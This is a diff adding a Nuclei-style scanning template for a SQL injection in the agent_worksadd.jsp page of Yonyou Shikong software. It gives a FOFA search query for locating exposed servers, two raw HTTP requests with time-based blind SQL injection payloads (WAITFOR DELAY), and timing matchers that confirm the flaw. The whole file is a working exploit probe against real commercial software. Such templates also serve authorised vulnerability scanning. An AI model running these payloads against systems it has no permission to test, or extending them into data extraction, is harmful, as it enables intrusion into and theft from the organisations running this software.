@@ -1,0 +1,29 @@
+id: yonyou-shikong-agent_worksadd-sqli
+info:
+  name: 时空用友 agent_worksadd 组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")
+      该漏洞源于时空用友系统agent_worksadd模块存在SQL注入缺陷，攻击者可通过构造恶意输入参数实现数据库查询操控，导致敏感数据泄露或篡改。
+  tags: 时空用友
+http:
+- raw:
+  - |
+    GET /worksheet/agent_worksadd.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  - |
+    GET /worksheet/agent_worksadd.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
